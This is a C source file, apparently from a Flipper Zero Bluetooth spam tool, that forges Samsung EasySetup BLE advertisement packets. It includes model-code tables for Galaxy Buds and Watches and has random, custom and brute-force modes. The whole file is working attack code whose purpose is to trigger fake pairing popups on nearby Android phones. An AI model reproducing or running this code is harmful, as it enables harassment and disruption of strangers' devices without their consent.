#include "easysetup.h"
#include "_protocols.h"

// Hacked together by @Willy-JL and @Spooks4576
// Research by @Spooks4576

const struct {
    uint32_t value;
    const char* name;
} buds_models[] = {
    {0xEE7A0C, "Fallback Buds"},
    {0x9D1700, "Fallback Dots"},
    {0x39EA48, "Light Purple Buds2"},
    {0xA7C62C, "Bluish Silver Buds2"},
    {0x850116, "Black Buds Live"},
    {0x3D8F41, "Gray & Black Buds2"},
    {0x3B6D02, "Bluish Chrome Buds2"},
    {0xAE063C, "Gray Beige Buds2"},
    {0xB8B905, "Pure White Buds"},
    {0xEAAA17, "Pure White Buds2"},
    {0xD30704, "Black Buds"},
    {0x9DB006, "French Flag Buds"},
    {0x101F1A, "Dark Purple Buds Live"},
    {0x859608, "Dark Blue Buds"},
    {0x8E4503, "Pink Buds"},
    {0x2C6740, "White & Black Buds2"},
    {0x3F6718, "Bronze Buds Live"},
    {0x42C519, "Red Buds Live"},
    {0xAE073A, "Black & White Buds2"},
    {0x011716, "Sleek Black Buds2"},
};
const uint8_t buds_models_count = COUNT_OF(buds_models);

const struct {
    uint8_t value;
    const char* name;
} watch_models[] = {
    {0x1A, "Fallback Watch"},
    {0x01, "White Watch4 Classic 44m"},
    {0x02, "Black Watch4 Classic 40m"},
    {0x03, "White Watch4 Classic 40m"},
    {0x04, "Black Watch4 44mm"},
    {0x05, "Silver Watch4 44mm"},
    {0x06, "Green Watch4 44mm"},
    {0x07, "Black Watch4 40mm"},
    {0x08, "White Watch4 40mm"},
    {0x09, "Gold Watch4 40mm"},
    {0x0A, "French Watch4"},
    {0x0B, "French Watch4 Classic"},
    {0x0C, "Fox Watch5 44mm"},
    {0x11, "Black Watch5 44mm"},
    {0x12, "Sapphire Watch5 44mm"},
    {0x13, "Purpleish Watch5 40mm"},
    {0x14, "Gold Watch5 40mm"},
    {0x15, "Black Watch5 Pro 45mm"},
    {0x16, "Gray Watch5 Pro 45mm"},
    {0x17, "White Watch5 44mm"},
    {0x18, "White & Black Watch5"},
    {0x1B, "Black Watch6 Pink 40mm"},
    {0x1C, "Gold Watch6 Gold 40mm"},
    {0x1D, "Silver Watch6 Cyan 44mm"},
    {0x1E, "Black Watch6 Classic 43m"},
    {0x20, "Green Watch6 Classic 43m"},
};
const uint8_t watch_models_count = COUNT_OF(watch_models);

static const char* type_names[EasysetupTypeCOUNT] = {
    [EasysetupTypeBuds] = "EasySetup Buds",
    [EasysetupTypeWatch] = "EasySetup Watch",
};
static const char* get_name(const Payload* payload) {
    const EasysetupCfg* cfg = &payload->cfg.easysetup;
    return type_names[cfg->type];
}

static uint8_t packet_sizes[EasysetupTypeCOUNT] = {
    [EasysetupTypeBuds] = 31,
    [EasysetupTypeWatch] = 15,
};
void make_packet(uint8_t* out_size, uint8_t** out_packet, Payload* payload) {
    EasysetupCfg* cfg = payload ? &payload->cfg.easysetup : NULL;

    EasysetupType type;
    if(cfg && cfg->type != 0x00) {
        type = cfg->type;
    } else {
        const EasysetupType types[] = {
            EasysetupTypeBuds,
            EasysetupTypeWatch,
        };
        type = types[rand() % COUNT_OF(types)];
    }

    uint8_t size = packet_sizes[type];
    uint8_t* packet = malloc(size);
    uint8_t i = 0;

    switch(type) {
    case EasysetupTypeBuds: {
        uint32_t model;
        switch(cfg ? payload->mode : PayloadModeRandom) {
        case PayloadModeRandom:
        default:
            model = buds_models[rand() % buds_models_count].value;
            break;
        case PayloadModeValue:
            model = cfg->data.buds.model;
            break;
        case PayloadModeBruteforce:
            model = cfg->data.buds.model = payload->bruteforce.value;
            break;
        }

        packet[i++] = 27; // Size
        packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
        packet[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
        packet[i++] = 0x00; // ...
        packet[i++] = 0x42;
        packet[i++] = 0x09;
        packet[i++] = 0x81;
        packet[i++] = 0x02;
        packet[i++] = 0x14;
        packet[i++] = 0x15;
        packet[i++] = 0x03;
        packet[i++] = 0x21;
        packet[i++] = 0x01;
        packet[i++] = 0x09;
        packet[i++] = (model >> 0x10) & 0xFF; // Buds Model / Color (?)
        packet[i++] = (model >> 0x08) & 0xFF; // ...
        packet[i++] = 0x01; // ... (Always static?)
        packet[i++] = (model >> 0x00) & 0xFF; // ...
        packet[i++] = 0x06;
        packet[i++] = 0x3C;
        packet[i++] = 0x94;
        packet[i++] = 0x8E;
        packet[i++] = 0x00;
        packet[i++] = 0x00;
        packet[i++] = 0x00;
        packet[i++] = 0x00;
        packet[i++] = 0xC7;
        packet[i++] = 0x00;

        packet[i++] = 16; // Size
        packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
        packet[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
        // Truncated AD segment, Android seems to fill in the rest with zeros
        break;
    }
    case EasysetupTypeWatch: {
        uint8_t model;
        switch(cfg ? payload->mode : PayloadModeRandom) {
        case PayloadModeRandom:
        default:
            model = watch_models[rand() % watch_models_count].value;
            break;
        case PayloadModeValue:
            model = cfg->data.watch.model;
            break;
        case PayloadModeBruteforce:
            model = cfg->data.watch.model = payload->bruteforce.value;
            break;
        }

        packet[i++] = 14; // Size
        packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
        packet[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
        packet[i++] = 0x00; // ...
        packet[i++] = 0x01;
        packet[i++] = 0x00;
        packet[i++] = 0x02;
        packet[i++] = 0x00;
        packet[i++] = 0x01;
        packet[i++] = 0x01;
        packet[i++] = 0xFF;
        packet[i++] = 0x00;
        packet[i++] = 0x00;
        packet[i++] = 0x43;
        packet[i++] = (model >> 0x00) & 0xFF; // Watch Model / Color (?)
        break;
    }
    default:
        break;
    }

    *out_size = size;
    *out_packet = packet;
}

enum {
    _ConfigBudsExtraStart = ConfigExtraStart,
    ConfigBudsModel,
    ConfigBudsInfoVersion,
    ConfigBudsCOUNT,
};
enum {
    _ConfigWatchExtraStart = ConfigExtraStart,
    ConfigWatchModel,
    ConfigWatchCOUNT,
};
static void config_callback(void* _ctx, uint32_t index) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    EasysetupCfg* cfg = &payload->cfg.easysetup;
    scene_manager_set_scene_state(ctx->scene_manager, SceneConfig, index);
    switch(cfg->type) {
    case EasysetupTypeBuds: {
        switch(index) {
        case ConfigBudsModel:
            scene_manager_next_scene(ctx->scene_manager, SceneEasysetupBudsModel);
            break;
        case ConfigBudsInfoVersion:
            break;
        default:
            ctx->fallback_config_enter(ctx, index);
            break;
        }
        break;
    }
    case EasysetupTypeWatch: {
        switch(index) {
        case ConfigWatchModel:
            scene_manager_next_scene(ctx->scene_manager, SceneEasysetupWatchModel);
            break;
        default:
            ctx->fallback_config_enter(ctx, index);
            break;
        }
        break;
    }
    default:
        ctx->fallback_config_enter(ctx, index);
        break;
    }
}
static void buds_model_changed(VariableItem* item) {
    Payload* payload = variable_item_get_context(item);
    EasysetupCfg* cfg = &payload->cfg.easysetup;
    uint8_t index = variable_item_get_current_value_index(item);
    if(index) {
        index--;
        payload->mode = PayloadModeValue;
        cfg->data.buds.model = buds_models[index].value;
        variable_item_set_current_value_text(item, buds_models[index].name);
    } else {
        payload->mode = PayloadModeRandom;
        variable_item_set_current_value_text(item, "Random");
    }
}
static void watch_model_changed(VariableItem* item) {
    Payload* payload = variable_item_get_context(item);
    EasysetupCfg* cfg = &payload->cfg.easysetup;
    uint8_t index = variable_item_get_current_value_index(item);
    if(index) {
        index--;
        payload->mode = PayloadModeValue;
        cfg->data.watch.model = watch_models[index].value;
        variable_item_set_current_value_text(item, watch_models[index].name);
    } else {
        payload->mode = PayloadModeRandom;
        variable_item_set_current_value_text(item, "Random");
    }
}
static void extra_config(Ctx* ctx) {
    Payload* payload = &ctx->attack->payload;
    EasysetupCfg* cfg = &payload->cfg.easysetup;
    VariableItemList* list = ctx->variable_item_list;
    VariableItem* item;
    size_t value_index;

    switch(cfg->type) {
    case EasysetupTypeBuds: {
        item = variable_item_list_add(
            list, "Model Code", buds_models_count + 1, buds_model_changed, payload);
        const char* model_name = NULL;
        char model_name_buf[9];
        switch(payload->mode) {
        case PayloadModeRandom:
        default:
            model_name = "Random";
            value_index = 0;
            break;
        case PayloadModeValue:
            for(uint8_t i = 0; i < buds_models_count; i++) {
                if(cfg->data.buds.model == buds_models[i].value) {
                    model_name = buds_models[i].name;
                    value_index = i + 1;
                    break;
                }
            }
            if(!model_name) {
                snprintf(model_name_buf, sizeof(model_name_buf), "%06lX", cfg->data.buds.model);
                model_name = model_name_buf;
                value_index = buds_models_count + 1;
            }
            break;
        case PayloadModeBruteforce:
            model_name = "Bruteforce";
            value_index = buds_models_count + 1;
            break;
        }
        variable_item_set_current_value_index(item, value_index);
        variable_item_set_current_value_text(item, model_name);

        variable_item_list_add(list, "Works on Android 13 and up", 0, NULL, NULL);
        break;
    }
    case EasysetupTypeWatch: {
        item = variable_item_list_add(
            list, "Model Code", watch_models_count + 1, watch_model_changed, payload);
        const char* model_name = NULL;
        char model_name_buf[3];
        switch(payload->mode) {
        case PayloadModeRandom:
        default:
            model_name = "Random";
            value_index = 0;
            break;
        case PayloadModeValue:
            for(uint8_t i = 0; i < watch_models_count; i++) {
                if(cfg->data.watch.model == watch_models[i].value) {
                    model_name = watch_models[i].name;
                    value_index = i + 1;
                    break;
                }
            }
            if(!model_name) {
                snprintf(model_name_buf, sizeof(model_name_buf), "%02X", cfg->data.watch.model);
                model_name = model_name_buf;
                value_index = watch_models_count + 1;
            }
            break;
        case PayloadModeBruteforce:
            model_name = "Bruteforce";
            value_index = watch_models_count + 1;
            break;
        }
        variable_item_set_current_value_index(item, value_index);
        variable_item_set_current_value_text(item, model_name);
        break;
    }
    default:
        break;
    }

    variable_item_list_set_enter_callback(list, config_callback, ctx);
}

static uint8_t config_counts[EasysetupTypeCOUNT] = {
    [EasysetupTypeBuds] = ConfigBudsCOUNT - ConfigExtraStart - 1,
    [EasysetupTypeWatch] = ConfigWatchCOUNT - ConfigExtraStart - 1,
};
static uint8_t config_count(const Payload* payload) {
    const EasysetupCfg* cfg = &payload->cfg.easysetup;
    return config_counts[cfg->type];
}

const Protocol protocol_easysetup = {
    .icon = &I_android,
    .get_name = get_name,
    .make_packet = make_packet,
    .extra_config = extra_config,
    .config_count = config_count,
};

static void buds_model_callback(void* _ctx, uint32_t index) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    EasysetupCfg* cfg = &payload->cfg.easysetup;
    switch(index) {
    case 0:
        payload->mode = PayloadModeRandom;
        scene_manager_previous_scene(ctx->scene_manager);
        break;
    case buds_models_count + 1:
        scene_manager_next_scene(ctx->scene_manager, SceneEasysetupBudsModelCustom);
        break;
    case buds_models_count + 2:
        payload->mode = PayloadModeBruteforce;
        payload->bruteforce.counter = 0;
        payload->bruteforce.value = cfg->data.buds.model;
        payload->bruteforce.size = 3;
        scene_manager_previous_scene(ctx->scene_manager);
        break;
    default:
        payload->mode = PayloadModeValue;
        cfg->data.buds.model = buds_models[index - 1].value;
        scene_manager_previous_scene(ctx->scene_manager);
        break;
    }
}
void scene_easysetup_buds_model_on_enter(void* _ctx) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    EasysetupCfg* cfg = &payload->cfg.easysetup;
    Submenu* submenu = ctx->submenu;
    uint32_t selected = 0;
    submenu_reset(submenu);

    submenu_add_item(submenu, "Random", 0, buds_model_callback, ctx);
    if(payload->mode == PayloadModeRandom) {
        selected = 0;
    }

    bool found = false;
    for(uint8_t i = 0; i < buds_models_count; i++) {
        submenu_add_item(submenu, buds_models[i].name, i + 1, buds_model_callback, ctx);
        if(!found && payload->mode == PayloadModeValue &&
           cfg->data.buds.model == buds_models[i].value) {
            found = true;
            selected = i + 1;
        }
    }
    submenu_add_item(submenu, "Custom", buds_models_count + 1, buds_model_callback, ctx);
    if(!found && payload->mode == PayloadModeValue) {
        selected = buds_models_count + 1;
    }

    submenu_add_item(submenu, "Bruteforce", buds_models_count + 2, buds_model_callback, ctx);
    if(payload->mode == PayloadModeBruteforce) {
        selected = buds_models_count + 2;
    }

    submenu_set_selected_item(submenu, selected);

    view_dispatcher_switch_to_view(ctx->view_dispatcher, ViewSubmenu);
}
bool scene_easysetup_buds_model_on_event(void* _ctx, SceneManagerEvent event) {
    UNUSED(_ctx);
    UNUSED(event);
    return false;
}
void scene_easysetup_buds_model_on_exit(void* _ctx) {
    UNUSED(_ctx);
}

static void buds_model_custom_callback(void* _ctx) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    EasysetupCfg* cfg = &payload->cfg.easysetup;
    payload->mode = PayloadModeValue;
    cfg->data.buds.model =
        (ctx->byte_store[0] << 0x10) + (ctx->byte_store[1] << 0x08) + (ctx->byte_store[2] << 0x00);
    scene_manager_previous_scene(ctx->scene_manager);
    scene_manager_previous_scene(ctx->scene_manager);
}
void scene_easysetup_buds_model_custom_on_enter(void* _ctx) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    EasysetupCfg* cfg = &payload->cfg.easysetup;
    ByteInput* byte_input = ctx->byte_input;

    byte_input_set_header_text(byte_input, "Enter custom Model Code");

    ctx->byte_store[0] = (cfg->data.buds.model >> 0x10) & 0xFF;
    ctx->byte_store[1] = (cfg->data.buds.model >> 0x08) & 0xFF;
    ctx->byte_store[2] = (cfg->data.buds.model >> 0x00) & 0xFF;

    byte_input_set_result_callback(
        byte_input, buds_model_custom_callback, NULL, ctx, (void*)ctx->byte_store, 3);

    view_dispatcher_switch_to_view(ctx->view_dispatcher, ViewByteInput);
}
bool scene_easysetup_buds_model_custom_on_event(void* _ctx, SceneManagerEvent event) {
    UNUSED(_ctx);
    UNUSED(event);
    return false;
}
void scene_easysetup_buds_model_custom_on_exit(void* _ctx) {
    UNUSED(_ctx);
}

static void watch_model_callback(void* _ctx, uint32_t index) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    EasysetupCfg* cfg = &payload->cfg.easysetup;
    switch(index) {
    case 0:
        payload->mode = PayloadModeRandom;
        scene_manager_previous_scene(ctx->scene_manager);
        break;
    case watch_models_count + 1:
        scene_manager_next_scene(ctx->scene_manager, SceneEasysetupWatchModelCustom);
        break;
    case watch_models_count + 2:
        payload->mode = PayloadModeBruteforce;
        payload->bruteforce.counter = 0;
        payload->bruteforce.value = cfg->data.watch.model;
        payload->bruteforce.size = 1;
        scene_manager_previous_scene(ctx->scene_manager);
        break;
    default:
        payload->mode = PayloadModeValue;
        cfg->data.watch.model = watch_models[index - 1].value;
        scene_manager_previous_scene(ctx->scene_manager);
        break;
    }
}
void scene_easysetup_watch_model_on_enter(void* _ctx) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    EasysetupCfg* cfg = &payload->cfg.easysetup;
    Submenu* submenu = ctx->submenu;
    uint32_t selected = 0;
    submenu_reset(submenu);

    submenu_add_item(submenu, "Random", 0, watch_model_callback, ctx);
    if(payload->mode == PayloadModeRandom) {
        selected = 0;
    }

    bool found = false;
    for(uint8_t i = 0; i < watch_models_count; i++) {
        submenu_add_item(submenu, watch_models[i].name, i + 1, watch_model_callback, ctx);
        if(!found && payload->mode == PayloadModeValue &&
           cfg->data.watch.model == watch_models[i].value) {
            found = true;
            selected = i + 1;
        }
    }
    submenu_add_item(submenu, "Custom", watch_models_count + 1, watch_model_callback, ctx);
    if(!found && payload->mode == PayloadModeValue) {
        selected = watch_models_count + 1;
    }

    submenu_add_item(submenu, "Bruteforce", watch_models_count + 2, watch_model_callback, ctx);
    if(payload->mode == PayloadModeBruteforce) {
        selected = watch_models_count + 2;
    }

    submenu_set_selected_item(submenu, selected);

    view_dispatcher_switch_to_view(ctx->view_dispatcher, ViewSubmenu);
}
bool scene_easysetup_watch_model_on_event(void* _ctx, SceneManagerEvent event) {
    UNUSED(_ctx);
    UNUSED(event);
    return false;
}
void scene_easysetup_watch_model_on_exit(void* _ctx) {
    UNUSED(_ctx);
}

static void watch_model_custom_callback(void* _ctx) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    EasysetupCfg* cfg = &payload->cfg.easysetup;
    payload->mode = PayloadModeValue;
    cfg->data.watch.model = (ctx->byte_store[0] << 0x00);
    scene_manager_previous_scene(ctx->scene_manager);
    scene_manager_previous_scene(ctx->scene_manager);
}
void scene_easysetup_watch_model_custom_on_enter(void* _ctx) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    EasysetupCfg* cfg = &payload->cfg.easysetup;
    ByteInput* byte_input = ctx->byte_input;

    byte_input_set_header_text(byte_input, "Enter custom Model Code");

    ctx->byte_store[0] = (cfg->data.watch.model >> 0x00) & 0xFF;

    byte_input_set_result_callback(
        byte_input, watch_model_custom_callback, NULL, ctx, (void*)ctx->byte_store, 1);

    view_dispatcher_switch_to_view(ctx->view_dispatcher, ViewByteInput);
}
bool scene_easysetup_watch_model_custom_on_event(void* _ctx, SceneManagerEvent event) {
    UNUSED(_ctx);
    UNUSED(event);
    return false;
}
void scene_easysetup_watch_model_custom_on_exit(void* _ctx) {
    UNUSED(_ctx);
}
